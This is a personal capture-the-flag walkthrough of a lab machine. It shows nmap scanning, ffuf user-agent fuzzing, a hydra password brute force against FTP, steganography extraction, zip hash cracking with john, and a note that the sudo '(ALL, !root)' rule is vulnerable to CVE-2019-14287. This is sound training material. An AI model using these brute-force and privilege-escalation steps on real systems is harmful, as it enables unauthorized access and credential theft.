```console
$ nmap 10.49.167.124 -T3 --min-rate 500 -p- -v -sC -sV -Pn
<!--SNIP-->
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
<!--SNIP-->

$ curl "http://10.49.167.124/"

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>

$ printf "%s\n" {A..Z} | ffuf -u "http://10.49.167.124/" -H "User-Agent: Agent FUZZ" -w - -fs 218

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.167.124/
 :: Wordlist         : FUZZ: -
 :: Header           : User-Agent: Agent FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 218
________________________________________________

:: Progress: [26/26] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

tried:
- different wordlists to:
    - fuzz paths
    - fuzz user agent
- also tried to use non standard lower `user-agent` header but again nothing

---

mistakes i did:
  - `-ac` flag in ffuf doesn't check response headers or status code, this would skip Location header
  - Tried fuzzing all smart variations instead of just a simplye alphabet fuzz
    
```console
$ printf "%s\n" {A..Z} | ffuf -u "http://10.49.167.124/" -w - -H "User-Agent: FUZZ" -ac -c -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.167.124/
 :: Wordlist         : FUZZ: -
 :: Header           : User-Agent: FUZZ
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 47ms]
C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 77ms]
:: Progress: [26/26] :: Job [1/1] :: 6 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

$ curl -A C "http://10.49.167.124/" -v
<!--SNIP-->
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Fri, 05 Jun 2026 11:24:11 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Location: agent_C_attention.php
< Content-Length: 218
< Content-Type: text/html; charset=UTF-8
<!--SNIP-->

$ curl "http://10.49.167.124/agent_C_attention.php"
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.49.167.124 ftp -vV

[21][ftp] host: 10.49.167.124   login: chris   password: crystal
```

ftp:


```
┌─[ayux@parrot]─[~]
└──╼ $cd /tmp/

┌─[ayux@parrot]─[/tmp]
└──╼ $ftp 10.49.167.124
Connected to 10.49.167.124.
220 (vsFTPd 3.0.3)
Name (10.49.167.124:ayux): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48922|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||56995|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*************************************************************************************************************************************************| 33143      207.07 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (157.79 KiB/s)
ftp> exit

┌─[ayux@parrot]─[/tmp]
└──╼ $stegseek cute-alien.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

┌─[✗]─[ayux@parrot]─[/tmp]
└──╼ $steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".

┌─[ayux@parrot]─[/tmp]
└──╼ $cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

i got the james password here hence user flag but room was asking password for a zip file password basically using stegseek to bruteforce the image was probably not required even though way faster:

```
┌─[ayux@parrot]─[/tmp]
└──╼ $ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

┌─[ayux@parrot]─[/tmp]
└──╼ $ binwalk -e cutie.png -Me

Scan Time:     2026-06-05 17:23:31
Target File:   /tmp/cutie.png
MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented


Scan Time:     2026-06-05 17:23:32
Target File:   /tmp/_cutie.png-2.extracted/365
MD5 Checksum:  1e7ac52e2601e6722fda312938ab2c1d
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented


┌─[ayux@parrot]─[/tmp/_cutie.png-5.extracted]
└──╼ $7z e 8702.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_IN Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):

┌─[ayux@parrot]─[/tmp/_cutie.png-5.extracted]
└──╼ $zip2john 8702.zip 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
┌─[ayux@parrot]─[/tmp/_cutie.png-5.extracted]
└──╼ $zip2john 8702.zip > zip.hash
┌─[ayux@parrot]─[/tmp/_cutie.png-5.extracted]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2026-06-05 17:29) 5.555g/s 136533p/s 136533c/s 136533C/s 123456..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌─[ayux@parrot]─[/tmp/_cutie.png.extracted]
└──╼ $cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

went to cybercheif and used the magic button in Output -> Area51. Basically we got the same password which stegseek cracked from fuzzing


answering the question to reverse the image



```
james@agent-sudo:~$ file Alien_autospy.jpg 
Alien_autospy.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1000x300, frames 3

┌─[ayux@parrot]─[/tmp]
└──╼ $exiftool Alien_autospy.jpg 
ExifTool Version Number         : 13.25
File Name                       : Alien_autospy.jpg
Directory                       : .
File Size                       : 42 kB
File Modification Date/Time     : 2019:06:20 00:00:43+05:30
File Access Date/Time           : 2026:06:05 17:43:02+05:30
File Inode Change Date/Time     : 2026:06:05 17:43:02+05:30
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 75%
XMP Toolkit                     : Adobe XMP Core 5.0-c061 64.140949, 2010/12/07-10:57:01
Creator Tool                    : Adobe Photoshop CS5.1 Macintosh
Instance ID                     : xmp.iid:9C93922F8AE411E9BC49D707FF8214D7
Document ID                     : xmp.did:9C9392308AE411E9BC49D707FF8214D7
Derived From Instance ID        : xmp.iid:9630A2E68ADA11E9BC49D707FF8214D7
Derived From Document ID        : xmp.did:9C93922E8AE411E9BC49D707FF8214D7
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1000
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1000x300
Megapixels                      : 0.300
```

do a reverse image lookup: https://tineye.com and search the image (foxnews.com has the name)

priv esc


```console
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 
```

Simply searched on google `(ALL, !root) /bin/bash privelege escaltion` vulnerable to https://www.exploit-db.com/exploits/47502 aka `CVE-2019-14287`
